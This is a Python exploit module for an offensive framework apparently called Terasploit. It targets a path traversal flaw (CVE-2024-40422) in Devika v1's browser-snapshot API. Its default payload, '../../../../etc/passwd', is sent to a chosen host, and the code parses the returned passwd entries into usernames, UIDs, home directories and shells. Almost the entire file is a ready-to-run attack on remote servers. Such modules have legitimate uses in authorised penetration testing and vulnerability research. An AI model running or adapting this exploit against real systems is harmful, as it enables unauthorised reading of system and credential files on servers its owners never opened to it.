#######
# Module/Auxiliary: Devika v1 Path Traversal VIA snapshot_path Parameter

from libs.terasploit.framework.opts.opt_container import *
from libs.terasploit.framework.info.info_container import *
from libs.terasploit.framework.module.auxiliary import *

class TerasploitModule(Auxiliary):
    
    def initialize(self,info_only: bool = False) -> None:
        update_info (
            {
                'License'     : 'Terasploit Framework License (BSD)',
                'Module'      : Module.auxiliary,
                'Name'        : 'Devika v1 Path Traversal VIA snapshot_path Parameter',
                'Version'     : 'v1',
                'Author'      : [
                    'Charlie <rupture6.dev[at]gmail.com>'
                ],
                'Description' : [
                    'manipulate the snapshot_path parameter to traverse directories and access ',
                    'sensitive files on the server.'
                ],
                'Reference'   : [
                    'CVE-2024-40422',
                    'https://github.com/j3r1ch0123/CVE-2024-40422',
                    'https://nvd.nist.gov/vuln/detail/CVE-2024-40422',
                    'https://www.exploity-db.com/auxiliarys/52066'
                ]
            }
        )

        if info_only:
            return
        
        register_option ('auxiliary',opt=[
            OptURL.create('rhost',['','yes','the remote host target (url)']),
            OptString.create('path',['../../../../etc/passwd','yes','path to inject in snapshot parameter'])
        ])
        
        
    def display_response(self,response):
        for i in ['----',response.text,'----']:
            print (i)
        
    
    def run(self):
        target, snapshot_path = self.OPT()
        self.ParseURL(target) 
        
        print_info(f'Target: {Target.scheme}://{Target.hostname}/api/get-browser-snapshot')
        try:
            response = HTTP.Request(
                'get',
                url=f'{Target.scheme}://{Target.hostname}/api/get-browser-snapshot',
                params={'snapshot_path' : snapshot_path}
            )
            
            self.display_response(response)
            passwd_pattern = re.compile(r"^([a-zA-Z0-9._-]+):([^:]*):(\d+):(\d+):([^:]*):([^:]*):([^:]*)$")
            contents = passwd_pattern.findall(response.text)
            for match in contents:
                user, password, uid, gid, comment, home, shell = match
                print("User: " + user)
                print("Password: " + password)
                print("UID: " + uid)
                print("GID: " + gid)
                print("Comment: " + comment)
                print("Home Directory: " + home)
                print("Shell: " + shell)
                print("----")
            return 'done', True
            
        except Exception as error:
            print_info (error,type='red')
            return 'exception', True